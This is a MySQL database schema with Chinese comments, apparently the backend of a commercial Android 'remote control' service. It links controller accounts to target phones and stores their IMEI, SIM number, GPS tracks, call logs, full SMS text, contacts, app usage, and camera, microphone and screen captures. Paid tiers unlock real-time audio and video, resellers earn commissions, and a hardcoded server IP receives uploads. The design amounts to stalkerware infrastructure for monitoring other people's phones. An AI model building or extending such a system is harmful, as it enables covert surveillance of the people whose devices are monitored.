-- 远程控制系统数据库设计
-- 创建时间: 2025-01-17
-- 数据库: remote_control

SET NAMES utf8mb4;
SET FOREIGN_KEY_CHECKS = 0;

-- ----------------------------
-- 用户表
-- ----------------------------
DROP TABLE IF EXISTS `users`;
CREATE TABLE `users` (
  `id` bigint(20) NOT NULL AUTO_INCREMENT COMMENT '用户ID',
  `phone` varchar(20) NOT NULL COMMENT '手机号',
  `password` varchar(255) NOT NULL COMMENT '密码(加密)',
  `nickname` varchar(50) DEFAULT NULL COMMENT '昵称',
  `avatar` varchar(255) DEFAULT NULL COMMENT '头像URL',
  `membership_type` tinyint(4) DEFAULT '0' COMMENT '会员类型: 0免费 1月费 2季费 3半年 4年费 5永久',
  `membership_expire` datetime DEFAULT NULL COMMENT '会员到期时间',
  `invite_code` varchar(10) DEFAULT NULL COMMENT '邀请码',
  `inviter_id` bigint(20) DEFAULT NULL COMMENT '邀请人ID',
  `agent_id` bigint(20) DEFAULT NULL COMMENT '代理ID',
  `status` tinyint(4) DEFAULT '1' COMMENT '状态: 0禁用 1正常',
  `last_login` datetime DEFAULT NULL COMMENT '最后登录时间',
  `created_at` datetime DEFAULT CURRENT_TIMESTAMP COMMENT '创建时间',
  `updated_at` datetime DEFAULT CURRENT_TIMESTAMP ON UPDATE CURRENT_TIMESTAMP COMMENT '更新时间',
  PRIMARY KEY (`id`),
  UNIQUE KEY `uk_phone` (`phone`),
  UNIQUE KEY `uk_invite_code` (`invite_code`),
  KEY `idx_inviter_id` (`inviter_id`),
  KEY `idx_agent_id` (`agent_id`)
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COMMENT='用户表';

-- ----------------------------
-- 设备表
-- ----------------------------
DROP TABLE IF EXISTS `devices`;
CREATE TABLE `devices` (
  `id` bigint(20) NOT NULL AUTO_INCREMENT COMMENT '设备ID',
  `user_id` bigint(20) NOT NULL COMMENT '用户ID',
  `device_id` varchar(100) NOT NULL COMMENT '设备唯一标识',
  `device_name` varchar(100) DEFAULT NULL COMMENT '设备名称',
  `device_model` varchar(100) DEFAULT NULL COMMENT '设备型号',
  `android_version` varchar(20) DEFAULT NULL COMMENT 'Android版本',
  `app_version` varchar(20) DEFAULT NULL COMMENT 'APP版本',
  `screen_width` int(11) DEFAULT NULL COMMENT '屏幕宽度',
  `screen_height` int(11) DEFAULT NULL COMMENT '屏幕高度',
  `screen_density` float DEFAULT NULL COMMENT '屏幕密度',
  `sim_card` varchar(50) DEFAULT NULL COMMENT 'SIM卡号',
  `imei` varchar(50) DEFAULT NULL COMMENT 'IMEI号',
  `location_lat` decimal(10,7) DEFAULT NULL COMMENT '纬度',
  `location_lng` decimal(10,7) DEFAULT NULL COMMENT '经度',
  `location_address` varchar(255) DEFAULT NULL COMMENT '地址',
  `location_time` datetime DEFAULT NULL COMMENT '定位时间',
  `online_status` tinyint(4) DEFAULT '0' COMMENT '在线状态: 0离线 1在线',
  `last_online` datetime DEFAULT NULL COMMENT '最后在线时间',
  `permissions` text COMMENT '权限列表(JSON)',
  `settings` text COMMENT '设备设置(JSON)',
  `status` tinyint(4) DEFAULT '1' COMMENT '状态: 0禁用 1正常',
  `created_at` datetime DEFAULT CURRENT_TIMESTAMP COMMENT '创建时间',
  `updated_at` datetime DEFAULT CURRENT_TIMESTAMP ON UPDATE CURRENT_TIMESTAMP COMMENT '更新时间',
  PRIMARY KEY (`id`),
  UNIQUE KEY `uk_device_id` (`device_id`),
  KEY `idx_user_id` (`user_id`),
  KEY `idx_online_status` (`online_status`)
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COMMENT='设备表';

-- ----------------------------
-- 设备控制关系表
-- ----------------------------
DROP TABLE IF EXISTS `device_controls`;
CREATE TABLE `device_controls` (
  `id` bigint(20) NOT NULL AUTO_INCREMENT COMMENT 'ID',
  `controller_id` bigint(20) NOT NULL COMMENT '控制者用户ID',
  `target_device_id` bigint(20) NOT NULL COMMENT '目标设备ID',
  `control_type` tinyint(4) DEFAULT '1' COMMENT '控制类型: 1临时 2永久',
  `permissions` text COMMENT '控制权限(JSON)',
  `expire_time` datetime DEFAULT NULL COMMENT '过期时间',
  `status` tinyint(4) DEFAULT '1' COMMENT '状态: 0禁用 1正常',
  `created_at` datetime DEFAULT CURRENT_TIMESTAMP COMMENT '创建时间',
  `updated_at` datetime DEFAULT CURRENT_TIMESTAMP ON UPDATE CURRENT_TIMESTAMP COMMENT '更新时间',
  PRIMARY KEY (`id`),
  KEY `idx_controller_id` (`controller_id`),
  KEY `idx_target_device_id` (`target_device_id`)
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COMMENT='设备控制关系表';

-- ----------------------------
-- 文件记录表
-- ----------------------------
DROP TABLE IF EXISTS `files`;
CREATE TABLE `files` (
  `id` bigint(20) NOT NULL AUTO_INCREMENT COMMENT '文件ID',
  `user_id` bigint(20) NOT NULL COMMENT '用户ID',
  `device_id` bigint(20) NOT NULL COMMENT '设备ID',
  `file_type` varchar(20) NOT NULL COMMENT '文件类型: photo,audio,video,screen,call_log,sms,contacts',
  `file_name` varchar(255) NOT NULL COMMENT '文件名',
  `file_path` varchar(500) NOT NULL COMMENT '文件路径',
  `file_size` bigint(20) DEFAULT NULL COMMENT '文件大小(字节)',
  `duration` int(11) DEFAULT NULL COMMENT '时长(秒)',
  `camera_type` tinyint(4) DEFAULT NULL COMMENT '摄像头类型: 1前置 2后置',
  `metadata` text COMMENT '元数据(JSON)',
  `created_at` datetime DEFAULT CURRENT_TIMESTAMP COMMENT '创建时间',
  PRIMARY KEY (`id`),
  KEY `idx_user_id` (`user_id`),
  KEY `idx_device_id` (`device_id`),
  KEY `idx_file_type` (`file_type`),
  KEY `idx_created_at` (`created_at`)
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COMMENT='文件记录表';

-- ----------------------------
-- 位置记录表
-- ----------------------------
DROP TABLE IF EXISTS `location_records`;
CREATE TABLE `location_records` (
  `id` bigint(20) NOT NULL AUTO_INCREMENT COMMENT 'ID',
  `device_id` bigint(20) NOT NULL COMMENT '设备ID',
  `latitude` decimal(10,7) NOT NULL COMMENT '纬度',
  `longitude` decimal(10,7) NOT NULL COMMENT '经度',
  `address` varchar(255) DEFAULT NULL COMMENT '地址',
  `accuracy` float DEFAULT NULL COMMENT '精度(米)',
  `speed` float DEFAULT NULL COMMENT '速度(m/s)',
  `bearing` float DEFAULT NULL COMMENT '方向角',
  `altitude` float DEFAULT NULL COMMENT '海拔',
  `provider` varchar(20) DEFAULT NULL COMMENT '定位提供者',
  `created_at` datetime DEFAULT CURRENT_TIMESTAMP COMMENT '创建时间',
  PRIMARY KEY (`id`),
  KEY `idx_device_id` (`device_id`),
  KEY `idx_created_at` (`created_at`)
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COMMENT='位置记录表';

-- ----------------------------
-- 应用使用记录表
-- ----------------------------
DROP TABLE IF EXISTS `app_usage_records`;
CREATE TABLE `app_usage_records` (
  `id` bigint(20) NOT NULL AUTO_INCREMENT COMMENT 'ID',
  `device_id` bigint(20) NOT NULL COMMENT '设备ID',
  `package_name` varchar(100) NOT NULL COMMENT '包名',
  `app_name` varchar(100) DEFAULT NULL COMMENT '应用名称',
  `start_time` datetime NOT NULL COMMENT '开始时间',
  `end_time` datetime DEFAULT NULL COMMENT '结束时间',
  `duration` int(11) DEFAULT NULL COMMENT '使用时长(秒)',
  `created_at` datetime DEFAULT CURRENT_TIMESTAMP COMMENT '创建时间',
  PRIMARY KEY (`id`),
  KEY `idx_device_id` (`device_id`),
  KEY `idx_package_name` (`package_name`),
  KEY `idx_start_time` (`start_time`)
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COMMENT='应用使用记录表';

-- ----------------------------
-- 敏感应用配置表
-- ----------------------------
DROP TABLE IF EXISTS `sensitive_apps`;
CREATE TABLE `sensitive_apps` (
  `id` bigint(20) NOT NULL AUTO_INCREMENT COMMENT 'ID',
  `device_id` bigint(20) NOT NULL COMMENT '设备ID',
  `package_name` varchar(100) NOT NULL COMMENT '包名',
  `app_name` varchar(100) DEFAULT NULL COMMENT '应用名称',
  `alert_enabled` tinyint(4) DEFAULT '1' COMMENT '是否启用提醒',
  `created_at` datetime DEFAULT CURRENT_TIMESTAMP COMMENT '创建时间',
  `updated_at` datetime DEFAULT CURRENT_TIMESTAMP ON UPDATE CURRENT_TIMESTAMP COMMENT '更新时间',
  PRIMARY KEY (`id`),
  UNIQUE KEY `uk_device_package` (`device_id`,`package_name`)
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COMMENT='敏感应用配置表';

-- ----------------------------
-- 通话记录表
-- ----------------------------
DROP TABLE IF EXISTS `call_logs`;
CREATE TABLE `call_logs` (
  `id` bigint(20) NOT NULL AUTO_INCREMENT COMMENT 'ID',
  `device_id` bigint(20) NOT NULL COMMENT '设备ID',
  `phone_number` varchar(20) NOT NULL COMMENT '电话号码',
  `contact_name` varchar(100) DEFAULT NULL COMMENT '联系人姓名',
  `call_type` tinyint(4) NOT NULL COMMENT '通话类型: 1呼入 2呼出 3未接',
  `call_time` datetime NOT NULL COMMENT '通话时间',
  `duration` int(11) DEFAULT NULL COMMENT '通话时长(秒)',
  `created_at` datetime DEFAULT CURRENT_TIMESTAMP COMMENT '创建时间',
  PRIMARY KEY (`id`),
  KEY `idx_device_id` (`device_id`),
  KEY `idx_call_time` (`call_time`)
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COMMENT='通话记录表';

-- ----------------------------
-- 短信记录表
-- ----------------------------
DROP TABLE IF EXISTS `sms_logs`;
CREATE TABLE `sms_logs` (
  `id` bigint(20) NOT NULL AUTO_INCREMENT COMMENT 'ID',
  `device_id` bigint(20) NOT NULL COMMENT '设备ID',
  `phone_number` varchar(20) NOT NULL COMMENT '电话号码',
  `contact_name` varchar(100) DEFAULT NULL COMMENT '联系人姓名',
  `message_type` tinyint(4) NOT NULL COMMENT '消息类型: 1接收 2发送',
  `content` text NOT NULL COMMENT '短信内容',
  `message_time` datetime NOT NULL COMMENT '短信时间',
  `created_at` datetime DEFAULT CURRENT_TIMESTAMP COMMENT '创建时间',
  PRIMARY KEY (`id`),
  KEY `idx_device_id` (`device_id`),
  KEY `idx_message_time` (`message_time`)
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COMMENT='短信记录表';

-- ----------------------------
-- 联系人表
-- ----------------------------
DROP TABLE IF EXISTS `contacts`;
CREATE TABLE `contacts` (
  `id` bigint(20) NOT NULL AUTO_INCREMENT COMMENT 'ID',
  `device_id` bigint(20) NOT NULL COMMENT '设备ID',
  `contact_id` varchar(50) NOT NULL COMMENT '联系人ID',
  `display_name` varchar(100) DEFAULT NULL COMMENT '显示名称',
  `phone_numbers` text COMMENT '电话号码(JSON数组)',
  `emails` text COMMENT '邮箱地址(JSON数组)',
  `created_at` datetime DEFAULT CURRENT_TIMESTAMP COMMENT '创建时间',
  `updated_at` datetime DEFAULT CURRENT_TIMESTAMP ON UPDATE CURRENT_TIMESTAMP COMMENT '更新时间',
  PRIMARY KEY (`id`),
  UNIQUE KEY `uk_device_contact` (`device_id`,`contact_id`)
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COMMENT='联系人表';

-- ----------------------------
-- 会员配置表
-- ----------------------------
DROP TABLE IF EXISTS `membership_configs`;
CREATE TABLE `membership_configs` (
  `id` bigint(20) NOT NULL AUTO_INCREMENT COMMENT 'ID',
  `membership_type` tinyint(4) NOT NULL COMMENT '会员类型: 0免费 1月费 2季费 3半年 4年费 5永久',
  `name` varchar(50) NOT NULL COMMENT '会员名称',
  `price` decimal(10,2) DEFAULT NULL COMMENT '价格',
  `duration_days` int(11) DEFAULT NULL COMMENT '有效期(天)',
  `features` text COMMENT '功能权限(JSON)',
  `limits` text COMMENT '使用限制(JSON)',
  `status` tinyint(4) DEFAULT '1' COMMENT '状态: 0禁用 1启用',
  `created_at` datetime DEFAULT CURRENT_TIMESTAMP COMMENT '创建时间',
  `updated_at` datetime DEFAULT CURRENT_TIMESTAMP ON UPDATE CURRENT_TIMESTAMP COMMENT '更新时间',
  PRIMARY KEY (`id`),
  UNIQUE KEY `uk_membership_type` (`membership_type`)
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COMMENT='会员配置表';

-- ----------------------------
-- 代理表
-- ----------------------------
DROP TABLE IF EXISTS `agents`;
CREATE TABLE `agents` (
  `id` bigint(20) NOT NULL AUTO_INCREMENT COMMENT '代理ID',
  `user_id` bigint(20) NOT NULL COMMENT '用户ID',
  `agent_code` varchar(20) NOT NULL COMMENT '代理编码',
  `agent_name` varchar(100) NOT NULL COMMENT '代理名称',
  `invite_link` varchar(255) DEFAULT NULL COMMENT '邀请链接',
  `commission_rate` decimal(5,2) DEFAULT '10.00' COMMENT '佣金比例(%)',
  `min_price` decimal(10,2) DEFAULT '0.00' COMMENT '最低价格',
  `total_users` int(11) DEFAULT '0' COMMENT '总用户数',
  `total_revenue` decimal(15,2) DEFAULT '0.00' COMMENT '总收益',
  `status` tinyint(4) DEFAULT '1' COMMENT '状态: 0禁用 1正常',
  `created_at` datetime DEFAULT CURRENT_TIMESTAMP COMMENT '创建时间',
  `updated_at` datetime DEFAULT CURRENT_TIMESTAMP ON UPDATE CURRENT_TIMESTAMP COMMENT '更新时间',
  PRIMARY KEY (`id`),
  UNIQUE KEY `uk_user_id` (`user_id`),
  UNIQUE KEY `uk_agent_code` (`agent_code`)
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COMMENT='代理表';

-- ----------------------------
-- 订单表
-- ----------------------------
DROP TABLE IF EXISTS `orders`;
CREATE TABLE `orders` (
  `id` bigint(20) NOT NULL AUTO_INCREMENT COMMENT '订单ID',
  `order_no` varchar(32) NOT NULL COMMENT '订单号',
  `user_id` bigint(20) NOT NULL COMMENT '用户ID',
  `agent_id` bigint(20) DEFAULT NULL COMMENT '代理ID',
  `membership_type` tinyint(4) NOT NULL COMMENT '会员类型',
  `amount` decimal(10,2) NOT NULL COMMENT '订单金额',
  `commission` decimal(10,2) DEFAULT '0.00' COMMENT '代理佣金',
  `payment_method` varchar(20) DEFAULT NULL COMMENT '支付方式',
  `payment_status` tinyint(4) DEFAULT '0' COMMENT '支付状态: 0待支付 1已支付 2已取消',
  `paid_at` datetime DEFAULT NULL COMMENT '支付时间',
  `created_at` datetime DEFAULT CURRENT_TIMESTAMP COMMENT '创建时间',
  `updated_at` datetime DEFAULT CURRENT_TIMESTAMP ON UPDATE CURRENT_TIMESTAMP COMMENT '更新时间',
  PRIMARY KEY (`id`),
  UNIQUE KEY `uk_order_no` (`order_no`),
  KEY `idx_user_id` (`user_id`),
  KEY `idx_agent_id` (`agent_id`)
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COMMENT='订单表';

-- ----------------------------
-- 广告表
-- ----------------------------
DROP TABLE IF EXISTS `advertisements`;
CREATE TABLE `advertisements` (
  `id` bigint(20) NOT NULL AUTO_INCREMENT COMMENT '广告ID',
  `title` varchar(100) NOT NULL COMMENT '广告标题',
  `content` text COMMENT '广告内容',
  `image_url` varchar(255) DEFAULT NULL COMMENT '图片URL',
  `link_url` varchar(255) DEFAULT NULL COMMENT '链接URL',
  `target_type` tinyint(4) DEFAULT '0' COMMENT '目标类型: 0全部 1指定会员类型',
  `target_membership` varchar(20) DEFAULT NULL COMMENT '目标会员类型',
  `start_time` datetime DEFAULT NULL COMMENT '开始时间',
  `end_time` datetime DEFAULT NULL COMMENT '结束时间',
  `status` tinyint(4) DEFAULT '1' COMMENT '状态: 0禁用 1启用',
  `created_at` datetime DEFAULT CURRENT_TIMESTAMP COMMENT '创建时间',
  `updated_at` datetime DEFAULT CURRENT_TIMESTAMP ON UPDATE CURRENT_TIMESTAMP COMMENT '更新时间',
  PRIMARY KEY (`id`)
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COMMENT='广告表';

-- ----------------------------
-- 系统配置表
-- ----------------------------
DROP TABLE IF EXISTS `system_configs`;
CREATE TABLE `system_configs` (
  `id` bigint(20) NOT NULL AUTO_INCREMENT COMMENT 'ID',
  `config_key` varchar(100) NOT NULL COMMENT '配置键',
  `config_value` text COMMENT '配置值',
  `description` varchar(255) DEFAULT NULL COMMENT '描述',
  `created_at` datetime DEFAULT CURRENT_TIMESTAMP COMMENT '创建时间',
  `updated_at` datetime DEFAULT CURRENT_TIMESTAMP ON UPDATE CURRENT_TIMESTAMP COMMENT '更新时间',
  PRIMARY KEY (`id`),
  UNIQUE KEY `uk_config_key` (`config_key`)
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COMMENT='系统配置表';

-- ----------------------------
-- 操作日志表
-- ----------------------------
DROP TABLE IF EXISTS `operation_logs`;
CREATE TABLE `operation_logs` (
  `id` bigint(20) NOT NULL AUTO_INCREMENT COMMENT 'ID',
  `user_id` bigint(20) DEFAULT NULL COMMENT '用户ID',
  `device_id` bigint(20) DEFAULT NULL COMMENT '设备ID',
  `operation_type` varchar(50) NOT NULL COMMENT '操作类型',
  `operation_desc` varchar(255) DEFAULT NULL COMMENT '操作描述',
  `request_data` text COMMENT '请求数据',
  `response_data` text COMMENT '响应数据',
  `ip_address` varchar(50) DEFAULT NULL COMMENT 'IP地址',
  `user_agent` varchar(500) DEFAULT NULL COMMENT '用户代理',
  `created_at` datetime DEFAULT CURRENT_TIMESTAMP COMMENT '创建时间',
  PRIMARY KEY (`id`),
  KEY `idx_user_id` (`user_id`),
  KEY `idx_device_id` (`device_id`),
  KEY `idx_operation_type` (`operation_type`),
  KEY `idx_created_at` (`created_at`)
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COMMENT='操作日志表';

-- ----------------------------
-- 初始化数据
-- ----------------------------

-- 插入会员配置
INSERT INTO `membership_configs` (`membership_type`, `name`, `price`, `duration_days`, `features`, `limits`) VALUES
(0, '免费版', 0.00, NULL, '{"photo":true,"audio":false,"video":false,"location":true,"screen":false}', '{"photo":5,"location":10}'),
(1, '月费版', 29.90, 30, '{"photo":true,"audio":true,"video":false,"location":true,"screen":true}', '{"photo":100,"audio":50,"location":1000}'),
(2, '季费版', 79.90, 90, '{"photo":true,"audio":true,"video":true,"location":true,"screen":true}', '{"photo":500,"audio":200,"video":50,"location":5000}'),
(3, '半年版', 149.90, 180, '{"photo":true,"audio":true,"video":true,"location":true,"screen":true,"realtime":true}', '{"photo":1000,"audio":500,"video":200,"location":10000}'),
(4, '年费版', 269.90, 365, '{"photo":true,"audio":true,"video":true,"location":true,"screen":true,"realtime":true,"advanced":true}', '{"photo":-1,"audio":-1,"video":-1,"location":-1}'),
(5, '永久版', 999.90, NULL, '{"photo":true,"audio":true,"video":true,"location":true,"screen":true,"realtime":true,"advanced":true,"premium":true}', '{"photo":-1,"audio":-1,"video":-1,"location":-1}');

-- 插入系统配置
INSERT INTO `system_configs` (`config_key`, `config_value`, `description`) VALUES
('app_version', '1.0.0', '当前APP版本'),
('min_app_version', '1.0.0', '最低支持APP版本'),
('server_url', 'http://114.215.211.109:3000', '服务器地址'),
('file_upload_url', 'http://114.215.211.109:3000/upload', '文件上传地址'),
('max_file_size', '104857600', '最大文件大小(100MB)'),
('location_interval', '3600', '默认定位间隔(秒)'),
('realtime_duration', '1200', '实时功能最大时长(秒)'),
('agent_min_commission', '5.00', '代理最低佣金比例(%)'),
('payment_methods', '["alipay","wechat","bank"]', '支付方式');

SET FOREIGN_KEY_CHECKS = 1;